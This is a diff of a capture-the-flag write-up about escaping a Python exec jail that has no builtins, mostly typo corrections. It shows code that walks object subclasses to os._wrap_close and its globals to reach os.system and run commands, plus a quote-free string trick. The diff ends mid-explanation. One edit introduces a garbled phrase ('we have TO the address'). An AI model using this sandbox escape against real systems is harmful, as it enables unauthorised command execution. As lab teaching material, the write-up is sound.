@@ -6,11 +6,11 @@ categories: [Writeups, HTBCTF]
 tags: [htb,ctf,writeup,htbctf] 
 ---
 ## Description:
-The extraterrestrials have upgraded their authentication system and now only them are able to pass. Did you manage to learn their language well enough in order to bypass the the authorization check?
+The extraterrestrials have upgraded their authentication system and now only they are able to pass. Did you manage to learn their language well enough in order to bypass the authorization check?
 
 ## Methodology
 
-This challenges has us placed in a python jail where we can provide very liminted input. Providing malformed input can get us a useful error message that gives us a little insight into what exactly this jail is doing.
+This challenge has us placed in a python jail where we can provide very limited input. Providing malformed input can get us a useful error message that gives us a little insight into what exactly this jail is doing.
 ```python
 File "/app/build_yourself_in.py", line 13, in main
     exec(text, {'__builtins__': None, 'print':print})
@@ -29,7 +29,7 @@ using the python built-in attribute __class__ and __bases__ we're able to return
 print(().__class__.__bases__)
 #Results in <class 'object'>
 ```
-This is really good news for us as it means we can now access any of the other classes that are used in this program that also inherit from object. We can get a nice list of these different classes by running ```().__class__.__bases__[0].__subclasses__()``` which returns an array containing all of the subclasses of object that have been imported into this program.
+This is really good news for us as it means we can now access any of the other classes that are used in this program that also inherit from object. We can get a nice list of these different classes by running ```().__class__.__bases__[0].__subclasses__()``` which returns an array containing all of the subclasses of objects that have been imported into this program.
 I cleaned up the output and got the following list
 ```python
 class 'type'
@@ -96,7 +96,7 @@ class '_sitebuiltins._Helper'
 ```
 This is an incredibly long list, but out of it there are a couple important classes for what we're trying to accomplish.
 
-```class 'str'``` is at postition 21 in the array and could be used to build a string without us inputting quotes.
+```class 'str'``` is at position 21 in the array and could be used to build a string without us inputting quotes.
 
 ```class 'os._wrap_close'``` is at position 132 and could be used to access the os.system() function for running commands on the server.
 We will start tinkering with the os._wrap_close class first.
@@ -108,7 +108,7 @@ At the bottom of the article they provide sample code to access system("ls") fro
 ```
 This shows that if you have the os._wrap_close class you can walk up the reference using ```__init__.__globals__``` to get a dictionary of all the functions that class implements.
 
-We can combine this with our previous command to get a long list of all functions we have access to through OS.
+We can combine this with our previous command to get a long list of all functions we have access to through the OS.
 ```python
 print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__)
 ```
@@ -122,7 +122,7 @@ This outputs
 In the middle of this incredibly long output we find the entry for **system**.
 Perfect, we're almost there!
 
-Now we have the address the elephant in the room... we still can't use quotes of any kind to build a string.<br />
+Now we have TO the address the elephant in the room... we still can't use quotes of any kind to build a string.<br />
 The original code we want to run is ```print(().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system']('ls'))```. We can do all of this except for the **system** and **ls** strings.<br />
 To get around this we need to go back to the str class we found previously in the class dump. The useful aspect of this function comes from the fact that if you give it a dictionary or array, it will return the string version of that object. In python string objects can be substringed with indices the same way you would an array.
 ```python
